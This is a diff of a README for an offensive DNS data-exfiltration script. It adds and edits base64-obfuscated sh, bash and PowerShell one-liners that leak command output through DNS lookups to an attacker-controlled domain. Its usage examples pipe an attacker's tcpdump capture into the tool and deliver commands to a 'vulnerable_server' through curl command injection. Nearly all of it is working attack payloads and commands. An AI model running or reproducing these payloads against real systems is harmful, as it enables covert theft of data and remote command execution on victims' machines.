@@ -6,24 +6,25 @@ For its operations, the script takes as input the command we want to run on the 
 
 Below are the supported command transformations, generated for the exfiltration of the command: `ls`
 
-bash variant 1:
+sh:
+```bash
+sh -c $@|base64${IFS}-d|sh . echo IGRpZyBAMCArdHJpZXM9NSBgKGxzKXxiYXNlNjQgLXcwfHdjIC1jYC5sZW4xNjAzNTQxMTc4LndoYXRldi5lcgo=
+```
+
+bash:
 ```bash
 bash -c {echo,IG5zbG9va3VwIGAobHMpfGJhc2U2NCAtdzB8d2MgLWNgLmxlbi4xNjAzMDMwNTYwLndoYXRldi5lcgo=}|{base64,-d}|bash
 ```
-bash variant 2:
-```bash
-bash -c $@|base64${IFS}-d|bash . echo IG5zbG9va3VwIGAobHMpfGJhc2U2NCAtdzB8d2MgLWNgLmxlbi4xNjAzMDMwODYwLndoYXRldi5lcgo=
-```
 
 powershell:
-```powershell
+```bash
 powershell -enc UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAkACgAIgB7ADAAfQAuAHsAMQB9AC4AewAyAH0AIgAgAC0AZgAgACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAoAGwAcwApACkAKQAuAGwAZQBuAGcAdABoACkALAAiAGwAZQBuACIALAAiADEANgAwADMAMAAzADAANAA4ADgALgB3AGgAYQB0AGUAdgAuAGUAcgAiACkACgA=
 ```
 
 ## Usage
 1. Local testing for bash:
 ```bash
-./dns_data_exfiltration.sh -h whatev.er -d "dig @0 +tries=5" -x ./dispatcher.sh -- 'ls -lha|grep secret' < <(stdbuf -oL tcpdump --immediate -l -i any udp port 53)
+./dns_data_exfiltration.sh -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret' < <(stdbuf -oL tcpdump --immediate -l -i any udp port 53)
 ```
 
 Contents of dispatcher.sh:
@@ -31,19 +32,19 @@ Contents of dispatcher.sh:
 
 2. Local testing for powershell with WSL2:
 ```bash
-stdbuf -oL tcpdump --immediate -l -i any udp port 53|./dns_data_exfiltration.sh -w -h whatev.er -d "Resolve-DnsName -Server wsl2_IP -Name" -x ./dispatcher.sh -- 'gci | % {$_.Name}'
+stdbuf -oL tcpdump --immediate -l -i any udp port 53|./dns_data_exfiltration.sh -w ps -h whatev.er -d "Resolve-DnsName -Server wsl2_IP -Name" -x dispatcher_examples/local_powershell_wsl2.sh -- 'gci | % {$_.Name}'
 ```
 
 Contents of dispatcher.sh:
-> /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -c "$1"
+> /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe ${@:1}
 
 3. powershell example where we ssh into our NS to get the incoming DNS requests.
 ```bash
-./dns_data_exfiltration.sh -w -h yourdns.ns -d "Resolve-DnsName" -x ./dispatcher.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
+./dns_data_exfiltration.sh -w ps -h yourdns.ns -d "Resolve-DnsName" -x ./dispatcher.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
 ```
 
 Contents of dispatcher.sh
-> curl https://vulnerable_server --data-urlencode "cmd=\${1}"
+> curl https://vulnerable_server --data-urlencode "cmd=${1}"
 
 4. More information on the options
 ```bash
